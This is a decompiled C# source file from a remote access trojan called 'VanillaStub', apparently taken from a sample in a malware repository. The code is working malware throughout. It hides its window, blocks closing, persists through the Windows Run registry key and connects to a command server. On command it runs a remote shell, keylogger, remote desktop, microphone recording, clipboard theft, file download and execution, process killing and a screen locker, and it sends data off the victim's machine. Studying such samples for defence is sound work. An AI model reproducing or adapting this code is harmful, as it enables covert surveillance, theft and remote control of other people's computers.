// Decompiled with JetBrains decompiler
// Type: VanillaStub.Forms.InitialForm
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using VanillaRatStub;
using VanillaStub.Helpers.Information;
using VanillaStub.Helpers.Services;
using VanillaStub.Helpers.Telepathy;

namespace VanillaStub.Forms
{
  public class InitialForm : Form
  {
    public const int WM_LBUTTONDOWN = 513;
    public const int WM_LBUTTONUP = 514;
    public const int WM_LBUTTONDBLCLK = 515;
    public const int WM_RBUTTONDOWN = 516;
    public const int WM_RBUTTONUP = 517;
    public const int WM_RBUTTONDBLCLK = 518;
    private readonly int Interval;
    private readonly int Port;
    private readonly bool Install;
    private readonly bool Startup;
    private bool ReceivingFile;
    private bool UpdateMode;
    private bool APActive;
    private bool ARActive;
    private bool SLActive;
    private string CurrentDirectory;
    private string FileToWrite;
    private string UpdateFileName;
    private readonly string InstallPath;
    private readonly string AudioPath;
    private readonly Chat C = new Chat();
    private readonly ScreenLock SL = new ScreenLock();
    private IContainer components = (IContainer) null;

    private async void ConnectLoop()
    {
      while (!VanillaStub.Helpers.Networking.Networking.MainClient.Connected)
      {
        await Task.Delay(50);
        VanillaStub.Helpers.Networking.Networking.MainClient.Connect(ClientSettings.DNS, this.Port);
      }
      while (VanillaStub.Helpers.Networking.Networking.MainClient.Connected)
      {
        await Task.Delay(this.Interval);
        this.GetData();
      }
      this.ConnectLoop();
    }

    [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int Record(
      string lpstrCommand,
      string lpstrReturnString,
      int uReturnLength,
      int hwndCallback);

    private void UninstallClient()
    {
      if (!this.Install || !this.Startup)
        return;
      Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath), false);
    }

    private void InstallClient()
    {
      if (!this.Install)
        return;
      if (Application.ExecutablePath == this.InstallPath)
      {
        if (!this.Startup)
          return;
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        registryKey.DeleteValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath), false);
        registryKey.SetValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath), (object) this.InstallPath);
      }
      else
      {
        File.Copy(Application.ExecutablePath, this.InstallPath, true);
        Process.Start(this.InstallPath);
        Process.GetCurrentProcess().Kill();
      }
    }

    private bool NetUpdated()
    {
      string name = "SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\\";
      return (int) RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey(name).GetValue("Release") >= 378389;
    }

    public InitialForm()
    {
      this.InitializeComponent();
      if (!this.NetUpdated())
        Process.Start("dotnetfx.exe");
      this.Interval = (int) Convert.ToInt16(ClientSettings.UpdateInterval);
      this.Port = (int) Convert.ToInt16(ClientSettings.Port);
      if (string.Equals(ClientSettings.Install, "true", StringComparison.OrdinalIgnoreCase))
        this.Install = true;
      if (string.Equals(ClientSettings.Startup, "true", StringComparison.OrdinalIgnoreCase))
        this.Startup = true;
      this.InstallPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + AppDomain.CurrentDomain.FriendlyName;
      this.AudioPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + "\\micaudio.wav";
      this.InstallClient();
    }

    private void OnClosing(object sender, FormClosingEventArgs e)
    {
      if (e.CloseReason != CloseReason.UserClosing)
        return;
      e.Cancel = true;
    }

    private void OnLoad(object sender, EventArgs e) => this.BeginInvoke((Delegate) (() => this.Hide()));

    private void OnShow(object sender, EventArgs e) => this.ConnectLoop();

    private void GetData()
    {
      VanillaStub.Helpers.Telepathy.Message message;
      while (VanillaStub.Helpers.Networking.Networking.MainClient.GetNextMessage(out message))
      {
        switch (message.eventType)
        {
          case EventType.Connected:
            Console.WriteLine("Connected");
            List<byte> byteList = new List<byte>();
            byteList.Add((byte) 2);
            byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes(ClientSettings.ClientTag));
            VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
            byteList.Clear();
            byteList.Add((byte) 14);
            byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes(ComputerInfo.GetAntivirus()));
            VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
            string s = ComputerInfo.GetWindowsVersion().Remove(ComputerInfo.GetWindowsVersion().IndexOf('('));
            byteList.Clear();
            byteList.Add((byte) 15);
            byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes(s));
            VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
            continue;
          case EventType.Data:
            this.HandleData(message.data);
            continue;
          default:
            continue;
        }
      }
    }

    [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
    private void HandleData(byte[] RawData)
    {
      if (this.ReceivingFile)
      {
        try
        {
          if (this.UpdateMode)
          {
            try
            {
              File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + this.UpdateFileName, RawData);
              Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + this.UpdateFileName);
              this.KillClient();
              return;
            }
            catch
            {
              return;
            }
          }
          else
          {
            string path = this.CurrentDirectory;
            if (path.Equals("BaseDirectory"))
              path = Path.GetPathRoot(Environment.SystemDirectory);
            File.WriteAllBytes(this.FileToWrite, RawData);
            string s = string.Empty;
            DirectoryInfo directoryInfo = new DirectoryInfo(path);
            foreach (DirectoryInfo directory in directoryInfo.GetDirectories())
              s = s + "][{" + directory.FullName + "}<Directory>[" + (object) directory.CreationTime + "]";
            foreach (FileInfo file in directoryInfo.GetFiles())
              s = s + "][{" + Path.GetFileNameWithoutExtension(file.FullName) + "}<" + file.Extension + ">[" + (object) file.CreationTime + "]";
            List<byte> byteList = new List<byte>();
            byteList.Add((byte) 5);
            byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes(s));
            VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
            byteList.Clear();
            byteList.Add((byte) 1);
            byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes("The file " + Path.GetFileName(this.FileToWrite) + " was uploaded."));
            VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
          }
        }
        catch
        {
        }
        this.ReceivingFile = false;
      }
      else
      {
        string empty = string.Empty;
        try
        {
          empty = Encoding.ASCII.GetString(RawData);
        }
        catch
        {
        }
        switch (empty)
        {
          case "CloseChat":
            this.CloseChat();
            break;
          case "DisconnectClient":
            this.DisconnectClient();
            break;
          case "GetClipboard":
            this.GetClipboard();
            break;
          case "GetComputerInfo":
            this.GetComputerInfo();
            break;
          case "GetProcesses":
            this.GetProcesses();
            break;
          case "GetStoredPasswords":
            this.GetPasswords();
            break;
          case "GoUpDir":
            this.GoUpDir();
            break;
          case "KillClient":
            this.KillClient();
            break;
          case "OpenChat":
            this.OpenChat();
            break;
          case "RaisePerms":
            this.RaisePerms();
            break;
          case "StartAR":
            this.StartAR();
            break;
          case "StartKL":
            this.StartKL();
            break;
          case "StartRD":
            this.StartRD();
            break;
          case "StartRS":
            this.StartRS();
            break;
          case "StartUsageStream":
            this.StartUsageStream();
            break;
          case "StopAR":
            this.StopAR();
            break;
          case "StopKL":
            this.StopKL();
            break;
          case "StopRD":
            this.StopRD();
            break;
          case "StopRS":
            this.StopRS();
            break;
          case "StopUsageStream":
            this.StopUsageStream();
            break;
          case "ToggleAntiProcess":
            this.ToggleAntiProcess();
            break;
          case "ToggleScreenlock":
            this.ToggleScreenlock();
            break;
        }
        if (empty.Contains("MsgBox"))
          this.MsgBox(empty);
        else if (empty.Contains("EndProcess"))
          this.EndProcess(empty);
        else if (empty.Contains("OpenWebsite"))
          this.OpenWebsite(empty);
        else if (empty.Contains("GetDF"))
          this.GetDF(empty);
        else if (empty.Contains("GetFile"))
          this.GetFile(empty);
        else if (empty.Contains("StartFileReceive"))
          this.StartFileReceive(empty);
        else if (empty.Contains("TryOpen"))
          this.TryOpen(empty);
        else if (empty.Contains("DeleteFile"))
          this.DeleteFile(empty);
        else if (empty.Contains("[<MESSAGE>]"))
          this.Message(empty.Replace("[<MESSAGE>]", ""));
        else if (empty.Contains("[<TTS>]"))
          this.TTS(empty.Replace("[<TTS>]", ""));
        else if (empty.Contains("[<COMMAND>]"))
        {
          this.Command(empty.Replace("[<COMMAND>]", ""));
        }
        else
        {
          if (!empty.Contains("[<MOUSE>]"))
            return;
          this.MouseClick(empty);
        }
      }
    }

    private void KillClient()
    {
      KeyloggerStream.Stop();
      this.UninstallClient();
      try
      {
        Process.GetCurrentProcess().Kill();
      }
      catch
      {
        Environment.Exit(0);
      }
    }

    private void DisconnectClient() => VanillaStub.Helpers.Networking.Networking.MainClient.Disconnect();

    private void ToggleScreenlock()
    {
      if (!this.SLActive)
      {
        this.SLActive = true;
        Cursor.Hide();
        List<byte> byteList = new List<byte>();
        byteList.Add((byte) 1);
        byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes("Started screen locker."));
        VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
        if (this.SL.Visible)
          return;
        this.SL.Show();
      }
      else
      {
        this.SLActive = false;
        Cursor.Show();
        List<byte> byteList = new List<byte>();
        byteList.Add((byte) 1);
        byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes("Stopped screen locker."));
        VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
        if (this.SL.Visible)
          this.SL.Hide();
      }
    }

    private void GetProcesses()
    {
      Process[] processes = Process.GetProcesses();
      List<string> source = new List<string>();
      foreach (Process process in processes)
        source.Add("{" + process.ProcessName + "}<" + (object) process.Id + ">[" + process.MainWindowTitle + "]");
      string[] array = source.ToArray<string>();
      List<byte> byteList = new List<byte>();
      byteList.Add((byte) 3);
      string s = "";
      foreach (string str in array)
        s = s + "][" + str;
      byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes(s));
      VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
    }

    private void RaisePerms()
    {
      new Process()
      {
        StartInfo = {
          FileName = Application.ExecutablePath,
          UseShellExecute = true,
          Verb = "runas"
        }
      }.Start();
      try
      {
        Process.GetCurrentProcess().Kill();
      }
      catch
      {
        Environment.Exit(0);
      }
    }

    private void MouseClick(string MouseArgs)
    {
      Point point = new Point((int) Convert.ToInt16(this.GetSubstringByString("[<X>]", "[<\\X>]", MouseArgs)), (int) Convert.ToInt16(this.GetSubstringByString("[<Y>]", "[<\\Y>]", MouseArgs)));
      VanillaStub.Helpers.Services.InputSimulator.InputSimulator inputSimulator = new VanillaStub.Helpers.Services.InputSimulator.InputSimulator();
      if (this.GetSubstringByString("[<MOUSE>]", "[<\\MOUSE>]", MouseArgs) == "DOUBLE")
      {
        Cursor.Position = point;
        inputSimulator.Mouse.LeftButtonDoubleClick();
      }
      else if (this.GetSubstringByString("[<MOUSE>]", "[<\\MOUSE>]", MouseArgs) == "SINGLE-LEFT")
      {
        Cursor.Position = point;
        inputSimulator.Mouse.LeftButtonClick();
      }
      else
      {
        if (!(this.GetSubstringByString("[<MOUSE>]", "[<\\MOUSE>]", MouseArgs) == "SINGLE-RIGHT"))
          return;
        Cursor.Position = point;
        inputSimulator.Mouse.RightButtonClick();
      }
    }

    private void MsgBox(string Data)
    {
      string substringByString1 = this.GetSubstringByString("<{", "}>", Data);
      string substringByString2 = this.GetSubstringByString("<", ">", substringByString1);
      string substringByString3 = this.GetSubstringByString("[", "]", substringByString1);
      string substringByString4 = this.GetSubstringByString("{", "}", substringByString1);
      string substringByString5 = this.GetSubstringByString("/", "\\", substringByString1);
      MessageBoxButtons buttons = MessageBoxButtons.OK;
      MessageBoxIcon icon = MessageBoxIcon.None;
      if (substringByString4.Equals("Abort Retry Ignore"))
        buttons = MessageBoxButtons.AbortRetryIgnore;
      else if (substringByString4.Equals("OK"))
        buttons = MessageBoxButtons.OK;
      else if (substringByString4.Equals("OK Cancel"))
        buttons = MessageBoxButtons.OKCancel;
      else if (substringByString4.Equals("Retry Cancel"))
        buttons = MessageBoxButtons.RetryCancel;
      else if (substringByString4.Equals("Yes No"))
        buttons = MessageBoxButtons.YesNo;
      else if (substringByString4.Equals("Yes No Cancel"))
        buttons = MessageBoxButtons.YesNoCancel;
      if (substringByString5.Equals("Asterisk"))
        icon = MessageBoxIcon.Asterisk;
      else if (substringByString5.Equals("Error"))
        icon = MessageBoxIcon.Hand;
      else if (substringByString5.Equals("Exclamation"))
        icon = MessageBoxIcon.Exclamation;
      else if (substringByString5.Equals("Hand"))
        icon = MessageBoxIcon.Hand;
      else if (substringByString5.Equals("Information"))
        icon = MessageBoxIcon.Asterisk;
      else if (substringByString5.Equals("None"))
        icon = MessageBoxIcon.None;
      else if (substringByString5.Equals("Question"))
        icon = MessageBoxIcon.Question;
      else if (substringByString5.Equals("Stop"))
        icon = MessageBoxIcon.Hand;
      else if (substringByString5.Equals("Warning"))
        icon = MessageBoxIcon.Exclamation;
      int num = (int) MessageBox.Show(substringByString2, substringByString3, buttons, icon);
    }

    private void TTS(string Message)
    {
      try
      {
        using (SpeechSynthesizer speechSynthesizer = new SpeechSynthesizer())
        {
          speechSynthesizer.SetOutputToDefaultAudioDevice();
          speechSynthesizer.Speak(Message);
          List<byte> byteList = new List<byte>();
          byteList.Add((byte) 1);
          byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes("The message " + Message + " was played."));
          VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
        }
      }
      catch
      {
      }
    }

    private void EndProcess(string Data)
    {
      string substringByString = this.GetSubstringByString("<{", "}>", Data);
      try
      {
        Process processById = Process.GetProcessById((int) Convert.ToInt16(substringByString));
        processById.Kill();
        List<byte> byteList = new List<byte>();
        byteList.Add((byte) 1);
        byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes("The process " + processById.ProcessName + " was killed."));
        VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
      }
      catch
      {
      }
    }

    private void OpenWebsite(string Data)
    {
      string substringByString = this.GetSubstringByString("<{", "}>", Data);
      try
      {
        Process.Start(substringByString);
        List<byte> byteList = new List<byte>();
        byteList.Add((byte) 1);
        byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes("The website " + substringByString + " was opened."));
        VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
      }
      catch
      {
      }
    }

    private void GetDF(string Data)
    {
      try
      {
        string path = this.GetSubstringByString("{", "}", Data);
        if (path.Equals("BaseDirectory"))
          path = Path.GetPathRoot(Environment.SystemDirectory);
        string s = string.Empty;
        DirectoryInfo directoryInfo = new DirectoryInfo(path);
        foreach (DirectoryInfo directory in directoryInfo.GetDirectories())
          s = s + "][{" + directory.FullName + "}<Directory>[" + (object) directory.CreationTime + "]";
        foreach (FileInfo file in directoryInfo.GetFiles())
          s = s + "][{" + Path.GetFileNameWithoutExtension(file.FullName) + "}<" + file.Extension + ">[" + (object) file.CreationTime + "]";
        List<byte> byteList = new List<byte>();
        byteList.Add((byte) 5);
        byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes(s));
        VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
        this.CurrentDirectory = path;
        byteList.Clear();
        byteList.Add((byte) 6);
        byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes(this.CurrentDirectory));
        VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
      }
      catch
      {
      }
    }

    private void GetFile(string Data)
    {
      try
      {
        byte[] numArray;
        using (FileStream fileStream = new FileStream(this.GetSubstringByString("{[", "]}", Data), FileMode.Open))
        {
          numArray = new byte[fileStream.Length];
          fileStream.Read(numArray, 0, numArray.Length);
        }
        List<byte> byteList = new List<byte>();
        byteList.Add((byte) 8);
        byteList.AddRange((IEnumerable<byte>) numArray);
        VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
      }
      catch (Exception ex)
      {
        List<byte> byteList = new List<byte>();
        byteList.Add((byte) 1);
        byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes("Error Downloading: " + ex.Message + ")"));
        VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
      }
    }

    private void StartFileReceive(string Data)
    {
      try
      {
        Random random = new Random();
        this.FileToWrite = this.GetSubstringByString("{", "}", Data);
        if (this.FileToWrite.Contains("[UPDATE]"))
        {
          this.UpdateMode = true;
          this.UpdateFileName = this.FileToWrite.Replace("[UPDATE]", "");
          if (this.UpdateFileName == AppDomain.CurrentDomain.FriendlyName)
            this.UpdateFileName = "Updated" + (object) random.Next(0, 1000);
        }
        this.ReceivingFile = true;
      }
      catch
      {
      }
    }

    private void TryOpen(string Data)
    {
      string substringByString = this.GetSubstringByString("{", "}", Data);
      try
      {
        Process.Start(substringByString);
        List<byte> byteList = new List<byte>();
        byteList.Add((byte) 1);
        byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes("The file " + Path.GetFileName(substringByString) + " was opened."));
        VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
      }
      catch
      {
      }
    }

    private void DeleteFile(string Data)
    {
      try
      {
        string substringByString = this.GetSubstringByString("{", "}", Data);
        File.Delete(substringByString);
        List<byte> byteList = new List<byte>();
        byteList.Add((byte) 1);
        byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes("The file " + Path.GetFileName(substringByString) + " was deleted."));
        VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
        this.GetDF(this.CurrentDirectory);
      }
      catch
      {
      }
    }

    private void Message(string Message)
    {
      if (!this.C.Visible)
        return;
      if (!string.IsNullOrWhiteSpace(this.C.txtChat.Text))
        this.C.txtChat.AppendText(Environment.NewLine + "Admin: " + Message);
      else
        this.C.txtChat.Text = "Admin: " + Message;
    }

    private void Command(string Command)
    {
      RemoteShellStream.WriteLine = true;
      RemoteShellStream.Input = Command;
    }

    private void GetComputerInfo()
    {
      string s = "";
      List<string> stringList = new List<string>();
      try
      {
        ComputerInfo.GetGeoInfo();
      }
      catch
      {
      }
      stringList.Add("Computer Name: " + ComputerInfo.GetName());
      stringList.Add("Computer CPU: " + ComputerInfo.GetCPU());
      stringList.Add("Computer GPU: " + ComputerInfo.GetGPU());
      stringList.Add("Computer Ram Amount (MB): " + (object) ComputerInfo.GetRamAmount());
      stringList.Add("Computer Antivirus: " + ComputerInfo.GetAntivirus());
      stringList.Add("Computer OS: " + ComputerInfo.GetWindowsVersion());
      stringList.Add("Country: " + ComputerInfo.GeoInfo.Country);
      stringList.Add("Region Name: " + ComputerInfo.GeoInfo.RegionName);
      stringList.Add("City: " + ComputerInfo.GeoInfo.City);
      foreach (string str in stringList.ToArray())
        s = s + "," + str;
      List<byte> byteList = new List<byte>();
      byteList.Add((byte) 4);
      byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes(s));
      VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
    }

    private void GetPasswords()
    {
    }

    private void GoUpDir()
    {
      try
      {
        List<byte> byteList = new List<byte>();
        byteList.Add((byte) 7);
        this.CurrentDirectory = Directory.GetParent(this.CurrentDirectory).ToString();
        byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes(this.CurrentDirectory));
        VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
      }
      catch
      {
      }
    }

    private void GetClipboard()
    {
      try
      {
        string ClipboardText = "Clipboard is empty or contains an invalid data type.";
        Thread thread = new Thread((ThreadStart) (() =>
        {
          if (!Clipboard.ContainsText(TextDataFormat.Text))
            return;
          ClipboardText = Clipboard.GetText(TextDataFormat.Text);
        }));
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
        thread.Join();
        List<byte> byteList = new List<byte>();
        byteList.Add((byte) 9);
        byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes(ClipboardText));
        VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
      }
      catch
      {
      }
    }

    private void ToggleAntiProcess()
    {
      if (!this.APActive)
      {
        this.APActive = true;
        AntiProcess.StartBlock();
        List<byte> byteList = new List<byte>();
        byteList.Add((byte) 1);
        byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes("Started Anti-Process."));
        VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
      }
      else
      {
        if (!this.APActive)
          return;
        this.APActive = false;
        AntiProcess.StopBlock();
        List<byte> byteList = new List<byte>();
        byteList.Add((byte) 1);
        byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes("Stopped Anti-Process."));
        VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
      }
    }

    private void StartRS() => RemoteShellStream.Start();

    private void StopRS() => RemoteShellStream.Stop();

    private void StartUsageStream() => HardwareUsageStream.Start();

    private void StopUsageStream() => HardwareUsageStream.Stop();

    private void StartRD() => RemoteDesktopStream.Start();

    private void StopRD() => RemoteDesktopStream.Stop();

    private void StartKL() => KeyloggerStream.Start();

    private void StopKL() => KeyloggerStream.Stop();

    private void OpenChat()
    {
      if (this.C.Visible)
        return;
      this.C.Show();
    }

    private void CloseChat()
    {
      if (!this.C.Visible)
        return;
      this.C.Hide();
    }

    private void StartAR()
    {
      try
      {
        if (this.ARActive)
          return;
        InitialForm.Record("open new Type waveaudio Alias recsound", "", 0, 0);
        InitialForm.Record("record recsound", "", 0, 0);
        if (File.Exists(this.AudioPath))
          File.Delete(this.AudioPath);
        this.ARActive = true;
      }
      catch
      {
      }
    }

    private void StopAR()
    {
      try
      {
        if (!this.ARActive)
          return;
        InitialForm.Record("save recsound " + this.AudioPath, "", 0, 0);
        InitialForm.Record("close recsound", "", 0, 0);
        Thread.Sleep(100);
        byte[] numArray;
        using (FileStream fileStream = new FileStream(this.AudioPath, FileMode.Open))
        {
          numArray = new byte[fileStream.Length];
          fileStream.Read(numArray, 0, numArray.Length);
        }
        List<byte> byteList = new List<byte>();
        byteList.Add((byte) 13);
        byteList.AddRange((IEnumerable<byte>) numArray);
        VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
        File.Delete(this.AudioPath);
        this.ARActive = false;
      }
      catch
      {
      }
    }

    private string GetSubstringByString(string a, string b, string c)
    {
      try
      {
        return c.Substring(c.IndexOf(a) + a.Length, c.IndexOf(b) - c.IndexOf(a) - a.Length);
      }
      catch
      {
        return "";
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(120, 0);
      this.FormBorderStyle = FormBorderStyle.FixedSingle;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (InitialForm);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.FormClosing += new FormClosingEventHandler(this.OnClosing);
      this.Load += new EventHandler(this.OnLoad);
      this.Shown += new EventHandler(this.OnShow);
      this.ResumeLayout(false);
    }

    internal struct INPUT
    {
      public uint Type;
      public InitialForm.MOUSEKEYBDHARDWAREINPUT Data;
    }

    [StructLayout(LayoutKind.Explicit)]
    internal struct MOUSEKEYBDHARDWAREINPUT
    {
      [FieldOffset(0)]
      public InitialForm.MOUSEINPUT Mouse;
    }

    internal struct MOUSEINPUT
    {
      public int X;
      public int Y;
      public uint MouseData;
      public uint Flags;
      public uint Time;
      public IntPtr ExtraInfo;
    }
  }
}
